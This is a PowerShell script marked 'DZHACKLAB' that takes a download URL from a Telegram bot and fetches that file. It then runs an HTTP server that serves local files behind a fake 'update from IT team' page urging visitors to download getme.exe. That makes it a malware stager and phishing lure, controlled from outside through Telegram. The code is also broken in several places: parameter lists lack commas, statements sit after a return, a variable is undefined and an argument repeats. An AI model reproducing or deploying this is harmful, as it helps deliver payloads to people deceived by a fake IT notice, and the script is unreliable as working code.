


function Log-Message
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$LogMessage
    )

    Write-Output (" [DZHACKLAB] - ELMO9AWIM {0} - {1}" -f (Get-Date), $LogMessage)
}

Log-Message " [*] START JOB ------------------- ELMO9AWIM "




function Execute-HTTP-DOWNLOAD-GetCommand()
{
  [CmdletBinding()]
  Param
  (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$FILE
        
        [Parameter(Mandatory=$true, Position=1)]
        [string]$SAVE
        
        [Parameter(Mandatory=$true, Position=2)]
        [string]$RUN
  )
  
  $webRequest = [System.Net.WebRequest]::Create($FILE)
  $webRequest.ServicePoint.Expect100Continue = $false
  $webRequest.Method = "Get"
  [System.Net.WebResponse]$resp = $webRequest.GetResponse()
  $rs = $resp.GetResponseStream()
  [System.IO.StreamReader]$sr = New-Object System.IO.StreamReader -argumentList $rs
  [string]$results = $sr.ReadToEnd()
  return $results
  
  return $result | Out-File -FilePath $SAVE
  
  
  
  (new-object System.Net.WebClient).DownloadFile( $FILE, $RUN)

  
  
}

Function Get-File-TeleDrooper-SERVER-HTTP{
  Param(
  [Parameter(Mandatory=$true,Position=0)] [String[]]$BId
  [Parameter(Mandatory=$true,Position=1)] [String[]]$BToken
  [Parameter(Mandatory=$true,Position=2)] [String[]]$FSave
  [Parameter(Mandatory=$true,Position=3)] [String[]]$FGet
  [Parameter(Mandatory=$true,Position=4)] [String[]]$FSERVER
  [Parameter(Mandatory=$true,Position=5)] [String[]]$FPORT
  [Parameter(Mandatory=$true,Position=6)] [String[]]$FHTML


 
  )
  Write-Output "BOT ID: $BId || BOT TOKEN: $BToken"


  $MyToken = $BToken
  $ChatID = $BId
  $MyBotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($MyToken)/getUpdates"
  #Convert the result from json and put them in an array
  $jsonresult = [array]($MyBotUpdates | ConvertFrom-Json).result

  $LastMessage = ""
  Foreach ($Result in $jsonresult)  {
    If ($Result.message.chat.id -eq $ChatID)  {
      $LastMessage = $Result.message.text
    }
  }

  Log-Message " [*] START DOWNLOADING ------------------- ELMO9AWIM "

  Write-Host "RUN ME $LastMessage"

  $TELEFILE = $LastMessage

  Log-Message " [*] WE WILL SERVE $FRun ------------------- ELMO9AWIM "


  Execute-HTTP-DOWNLOAD-GetCommand $TELEFILE $FSave $FRun

  Log-Message " [*] END JOB ------------------- ELMO9AWIM "
  
  
  Log-Message " [*] START SERVER ------------------- ELMO9AWIM "

    
  $httpsrvlsnr = New-Object System.Net.HttpListener;
  $httpsrvlsnr.Prefixes.Add("$FSERVER:$FPORT/");
  $httpsrvlsnr.Start();
  $webroot = New-PSDrive -Name webroot -PSProvider FileSystem -Root $PWD.Path
  [byte[]]$buffer = $null

  while ($httpsrvlsnr.IsListening) {
    try {
        $ctx = $httpsrvlsnr.GetContext();
        
        if ($ctx.Request.RawUrl -eq "/") {
            $buffer = [System.Text.Encoding]::UTF8.GetBytes("<html>$FHTML<pre>$(Get-ChildItem -Path $PWD.Path -Force | Out-String)</pre><p> PLEASE DOWNLOAD $FGet FOR UPDATE <p></html>");
            $ctx.Response.ContentLength64 = $buffer.Length;
            $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
        }
        elseif ($ctx.Request.RawUrl -eq "/stop"){
            $httpsrvlsnr.Stop();
            Remove-PSDrive -Name webroot -PSProvider FileSystem;
        }
        elseif ($ctx.Request.RawUrl -match "\/[A-Za-z0-9-\s.)(\[\]]") {
            if ([System.IO.File]::Exists((Join-Path -Path $PWD.Path -ChildPath $ctx.Request.RawUrl.Trim("/\")))) {
                $buffer = [System.Text.Encoding]::UTF8.GetBytes((Get-Content -Path (Join-Path -Path $PWD.Path -ChildPath $ctx.Request.RawUrl.Trim("/\"))));
                $ctx.Response.ContentLength64 = $buffer.Length;
                $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
            } 
        }

    }
    catch [System.Net.HttpListenerException] {
        Write-Host ($_);
        }
    }
}

# Get-File-TeleDrooper-SERVER-HTTP -BId "TELEGRAM ID" -BToken "TELEGRAM TOKEN" -FSave "getme.txt" -FGet "getme.exe" -FSERVER "http://0.0.0.0" -FSERVER "8080" -FHTML "<H1> HELLO ON UPDATE SYS FROM IT TEAM </H1>"

